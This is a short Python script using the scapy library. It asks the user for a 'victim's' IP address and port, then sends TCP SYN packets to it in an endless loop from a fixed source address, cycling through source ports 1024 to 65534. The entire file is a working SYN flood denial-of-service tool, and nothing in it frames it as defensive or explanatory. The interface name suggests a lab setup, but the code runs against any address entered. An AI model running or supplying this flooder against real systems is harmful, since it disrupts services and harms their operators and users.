from scapy.all import *

def send_func(dest_ip, dest_port): 
	s = conf.L3socket(iface='T-bag-eth0') ######## T-bag's socket
	src_ip = "10.0.8.8"
	ip = IP(src=src_ip,dst=dest_ip)
	while 1:
		for i in source_ports:
			syn = TCP(sport=i,dport=dest_port,flags='S')
			s.send(ip / syn)

dest_ip = raw_input("Enter Victim's IP Address: ")
dest_port = raw_input("Enter Victim's Port: ")
source_ports = range(1024, 65535)
send_func(dest_ip, int(dest_port)) 


